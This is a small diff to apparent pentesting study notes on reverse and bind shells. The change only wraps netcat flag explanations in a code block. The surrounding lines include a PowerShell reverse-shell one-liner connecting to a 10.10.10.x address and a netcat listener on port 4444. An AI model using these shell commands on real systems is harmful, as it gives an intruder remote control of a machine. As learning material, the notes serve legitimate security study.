@@ -170,10 +170,12 @@ powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.
 ```bash
 nc -lvpn 4444
 ```
+```
 -l - listen for a connection
 -v - verbose mode
 -n - disable dns resolution only connect from IPs
 -p - define the port you want active connection on
+```
 
 **Bind Shell** - Listens on an open port to catch an incoming connection. Like your binding bash to listen on x port, and when it recieves a connection that port will open a shell session for the target host. Pros is once its setup the port is open its reliable and if you lose connection you can connect right back.
 Types(Listen for incoming):
